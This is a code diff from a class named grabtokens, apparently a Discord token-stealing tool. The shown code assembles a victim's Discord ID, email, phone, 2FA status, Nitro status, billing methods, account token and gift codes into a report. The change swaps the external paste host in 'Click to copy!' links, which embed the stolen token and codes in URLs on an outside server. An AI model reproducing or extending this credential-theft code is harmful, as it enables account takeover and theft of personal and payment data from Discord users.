@@ -316,7 +316,7 @@ class grabtokens():
                 except TypeError: 
                     methods += "❓"
 
-            val += f'<:1119pepesneakyevil:972703371221954630> `Discord ID:` **{discord_id}** \n<:gmail:996083031632773181> `Email:` **{email}**\n<:mobilephone:996101721879224331> `Phone:` **{phone}**\n\n<:2fa:996102455744012428> `2FA:` **{mfa}**\n<a:nitroboost:996004213354139658> `Nitro:` **{nitro}**\n<:billing:996099943574012024> `Billing:` **{methods}**\n\n<:pepehappy:996100452112400526> `Token:` **{token}**\n[Click to copy!](https://paste.addi00000.repl.co/?p={token})\n'
+            val += f'<:1119pepesneakyevil:972703371221954630> `Discord ID:` **{discord_id}** \n<:gmail:996083031632773181> `Email:` **{email}**\n<:mobilephone:996101721879224331> `Phone:` **{phone}**\n\n<:2fa:996102455744012428> `2FA:` **{mfa}**\n<a:nitroboost:996004213354139658> `Nitro:` **{nitro}**\n<:billing:996099943574012024> `Billing:` **{methods}**\n\n<:pepehappy:996100452112400526> `Token:` **{token}**\n[Click to copy!](https://paste-pgpj.onrender.com/?p={token})\n'
 
             g = requests.get(
                 "https://discord.com/api/v9/users/@me/outbound-promotions/codes",
@@ -338,7 +338,7 @@ class grabtokens():
                 val += f'\n:gift: **None**\n'
             else:
                 for c, t in val_codes:
-                    val += f'\n:gift: `{t}:`\n**{c}**\n[Click to copy!](https://paste.addi00000.repl.co/?p={c})\n'
+                    val += f'\n:gift: `{t}:`\n**{c}**\n[Click to copy!](https://paste-pgpj.onrender.com/?p={c})\n'
 
             embed.add_field(name=val_name, value=val, inline=False)
 
